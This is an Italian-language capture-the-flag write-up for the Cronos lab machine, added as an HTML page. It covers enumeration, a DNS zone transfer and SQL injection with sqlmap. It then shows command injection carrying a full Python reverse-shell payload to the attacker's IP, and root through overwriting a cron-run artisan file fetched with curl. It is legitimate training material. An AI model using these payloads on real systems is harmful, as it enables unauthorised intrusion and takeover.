@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cronos - CTF Writeup - Davide Zorzella</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Caveat:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+  <canvas id="particles"></canvas>
+  <div class="signature">Davide Z.</div>
+  <div class="theme-pill">
+    <button class="theme-toggle" id="theme-toggle" aria-label="Cambia tema">
+      <svg class="icon-sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/>
+      </svg>
+      <svg class="icon-moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/>
+      </svg>
+    </button>
+  </div>
+  <main>
+    <article class="article-content">
+      <img src="../assets/writing/cronos/cronos-pwn.png" alt="cronos pwn" style="margin-bottom: 48px;">
+
+      <p>
+        <strong>IP:</strong> 10.10.10.13
+      </p>
+      <p>
+        Cronos si concentra principalmente su diversi vettori di enumerazione ed enfatizza i rischi associati all'aggiunta di file scrivibili da tutti al crontab di root. Questa macchina include anche una SQL injection di livello introduttivo.
+      </p>
+
+      <h2>Enumerazione</h2>
+      <p>
+        Eseguendo nmap, troviamo 3 porte TCP aperte:
+      </p>
+      <pre><code>nmap -sC -sV 10.10.10.13</code></pre>
+      <pre><code>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 06:12 EST
+Nmap scan report for cronos.htb (10.10.10.13)
+Host is up (0.045s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
+53/tcp open  domain  ISC BIND 9.10.3-P4
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:/o:linux,linux_kernel</code></pre>
+
+      <p>
+        Enumerando i virtual host, scopriamo un subdominio admin nascosto:
+      </p>
+      <pre><code>ffuf -u http://10.10.10.13 -H "Host: FUZZ.cronos.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 11439</code></pre>
+      <pre><code>:: Method           : GET
+:: URL              : http://10.10.10.13
+:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+:: Header           : Host: FUZZ.cronos.htb
+:: Filter           : Response size: 11439
+
+www                     [Status: 200, Size: 2319]
+admin                   [Status: 200, Size: 1547]</code></pre>
+
+      <p>
+        Eseguendo un DNS Zone Transfer che sfrutta il DNS sulla porta 53 rivela il subdominio admin:
+      </p>
+      <pre><code>dig axfr cronos.htb @cronos.htb</code></pre>
+      <pre><code>cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
+cronos.htb.             604800  IN      NS      ns1.cronos.htb.
+cronos.htb.             604800  IN      A       10.10.10.13
+admin.cronos.htb.       604800  IN      A       10.10.10.13
+ns1.cronos.htb.         604800  IN      A       10.10.10.13
+www.cronos.htb.         604800  IN      A       10.10.10.13</code></pre>
+
+      <p>
+        Assicurarsi di aggiungerli al file `/etc/hosts` per accedere usando la configurazione DNS locale:
+      </p>
+      <pre><code>cat /etc/hosts</code></pre>
+      <pre><code>127.0.0.1       localhost
+10.10.10.13     cronos.htb admin.cronos.htb www.cronos.htb</code></pre>
+
+      <h2>Vulnerabilità e Scanning</h2>
+
+      <h3>Login form su admin.cronos.htb</h3>
+      <p>
+        La form di login su admin.cronos.htb non sembra accettare credenziali di default come admin:admin. Proviamo una vecchia scuola SQL injection con sqlmap:
+      </p>
+      <pre><code>sqlmap -u "http://admin.cronos.htb/" --forms -v 6 --output-dir="./sqlmap_results"</code></pre>
+      <p>
+        Il payload riesce a reindirizzarci alla welcome page:
+      </p>
+      <img src="../assets/writing/cronos/cronos-1.png" alt="Welcome page" class="center">
+
+      <h3>Esecuzione comandi</h3>
+      <p>
+        La pagina propone 2 comandi: traceroute e ping.
+      </p>
+      <img src="../assets/writing/cronos/cronos-2.png" alt="commands" class="center">
+
+      <h2>Exploitation</h2>
+
+      <h3>Command Injection</h3>
+      <p>
+        Proviamo una semplice command injection nel parametro host. Sulla macchina locale avviamo un reverse shell listener con netcat:
+      </p>
+      <pre><code>nc -lvnp 4444</code></pre>
+
+      <p>
+        Usiamo questo payload da <a href="https://www.revshells.com" target="_blank" rel="noopener">revshells.com</a>:
+      </p>
+      <pre><code>export RHOST="10.10.14.21";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'</code></pre>
+
+      <p>
+        La request di exploit:
+      </p>
+      <pre><code>POST /welcome.php HTTP/1.1
+Host: admin.cronos.htb
+Content-Type: application/x-www-form-urlencoded
+
+command=ping+-c+1&amp;host=10.10.14.21;export+RHOST%3d"10.10.14.21"%3bexport+RPORT%3d4444%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'</code></pre>
+
+      <p>
+        Che ci dà il reverse shell:
+      </p>
+      <pre><code>connect to [10.10.14.21] from (UNKNOWN) [10.10.10.13] 46334
+$ whoami
+www-data
+$ cat /home/noulis/user.txt
+{flag}</code></pre>
+
+      <h2>Privilege Escalation</h2>
+      <p>
+        Dato che questa macchina si chiama cronos, mi aspetto di trovare qualcosa di utile sui cron jobs. Analizziamo quello che troviamo usando linPEAS!
+      </p>
+      <pre><code>/etc/cron.d:
+total 24
+-rw-r--r--  1 root root  670 Mar  1 2016 php
+-rw-r--r--  1 root root  191 Mar 22 2017 popularity-contest
+
+* * * * *       root    php /var/www/laravel/artisan schedule:run >> /dev/null 2&gt;&amp;1</code></pre>
+
+      <p>
+        Quest'ultima è piuttosto interessante. Dovremmo avere accesso in lettura/scrittura a questo cron job programmato. Dato che possiamo alterare il contenuto di `/var/www/laravel/artisan` come vogliamo, sostituiamo questo file con una PHP reverse shell generata da <a href="https://www.revshells.com" target="_blank" rel="noopener">revshells.com</a>.
+      </p>
+
+      <p>
+        Hostiamo il file sulla nostra macchina locale:
+      </p>
+      <pre><code>python3 -m http.server 3000</code></pre>
+
+      <p>
+        Prepariamo un listener per il reverse shell:
+      </p>
+      <pre><code>nc -lvnp 4444</code></pre>
+
+      <p>
+        E recuperiamolo sulla macchina target:
+      </p>
+      <pre><code>www-data@cronos:/var/www/laravel$ curl 10.10.14.21:3000/revshell.php > artisan</code></pre>
+
+      <p>
+        Questo esegue istantaneamente l'exploit PHP, ottenendo l'accesso root via reverse shell:
+      </p>
+      <pre><code>connect to [10.10.14.21] from (UNKNOWN) [10.10.10.13] 46350
+Linux cronos 4.4.0-72-generic x86_64
+uid=0(root) gid=0(root) groups=0(root)
+root@cronos:/# whoami
+root</code></pre>
+      <p style="margin-top: 48px; padding-top: 24px; border-top: 1px solid var(--border); color: var(--text-secondary); font-size: 0.875rem;">
+        <a href="../" style="color: var(--text-secondary);">&larr; Torna alla home</a>
+      </p>
+    </article>
+  </main>
+  <footer>
+    <p>Ultimo aggiornamento: Luglio 2026</p>
+  </footer>
+  <script>
+    (function(){var t=document.getElementById('theme-toggle'),h=document.documentElement,s=localStorage.getItem('cv-theme');function st(t){h.setAttribute('data-theme',t);localStorage.setItem('cv-theme',t);}if(s)st(s);else if(window.matchMedia('(prefers-color-scheme:dark)').matches)st('dark');t.addEventListener('click',function(){var c=h.getAttribute('data-theme');st(c==='dark'?'light':'dark');});})();(function(){var n='Davide Zorzella',e=document.getElementById('typing-name');if(!e)return;if(window.matchMedia('(prefers-reduced-motion:reduce)').matches){e.textContent=n;return;}var i=0;function t(){if(i<n.length){e.textContent+=n.charAt(i);i++;setTimeout(t,80+Math.random()*60);}}setTimeout(t,400);})();
+  </script>
+  <script>
+    (function(){var c=document.getElementById('particles');if(!c)return;var x=c.getContext('2d'),p=[],w,h,md=120,a;function resize(){w=c.width=window.innerWidth;h=c.height=window.innerHeight;}function createParticles(){p=[];var n=Math.min(Math.floor((w*h)/18000),80);for(var i=0;i<n;i++)p.push({x:Math.random()*w,y:Math.random()*h,vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:1.5+Math.random()*1.5});}function gc(){var d=document.documentElement.getAttribute('data-theme')==='dark';return d?'rgba(60,60,60,':'rgba(180,180,180,';}function gl(){var d=document.documentElement.getAttribute('data-theme')==='dark';return d?'rgba(255,255,255,':'rgba(0,0,0,';}function draw(){x.clearRect(0,0,w,h);var dc=gc(),gl2=gl();for(var i=0;i<p.length;i++){var v=p[i];v.x+=v.vx;v.y+=v.vy;if(v.x<0||v.x>w)v.vx*=-1;if(v.y<0||v.y>h)v.vy*=-1;x.beginPath();x.arc(v.x,v.y,v.r,0,Math.PI*2);x.fillStyle=dc+'0.5)';x.fill();for(var j=i+1;j<p.length;j++){var v2=p[j],dx=v.x-v2.x,dy=v.y-v2.y,dist=Math.sqrt(dx*dx+dy*dy);if(dist<md){x.beginPath();x.moveTo(v.x,v.y);x.lineTo(v2.x,v2.y);x.strokeStyle=gl2+(0.08*(1-dist/md))+')';x.lineWidth=.5;x.stroke();}}}a=requestAnimationFrame(draw);}window.addEventListener('resize',function(){resize();createParticles();});resize();createParticles();draw();document.addEventListener('visibilitychange',function(){if(document.hidden)cancelAnimationFrame(a);else draw();});})();
+  </script>
+</body>
+</html>
